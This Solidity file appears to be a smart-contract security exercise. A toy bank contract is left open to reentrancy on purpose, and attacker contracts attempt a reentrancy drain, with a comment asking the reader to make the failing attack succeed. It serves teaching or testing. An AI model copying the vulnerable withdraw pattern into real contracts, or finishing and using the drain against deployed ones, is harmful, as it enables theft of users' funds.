pragma solidity 0.8.15;

contract DumbBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "not enough funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface IDumbBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

// This attack fails. Make the attack succeed.
contract BankRobber {
    DumbBank dumbBank;

    constructor(DumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
        TrueBankRobber TrueBankrobber = new TrueBankRobber{value: msg.value}(_dumbBank);
        TrueBankrobber.attack();
    }
}

contract TrueBankRobber {
    DumbBank dumbBank;
    constructor(DumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
    }
    function attack() public payable {
        dumbBank.deposit{value: 1 ether}();
        dumbBank.withdraw(1 ether);
    }

    fallback() external payable {
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }

    receive() external payable {}
}
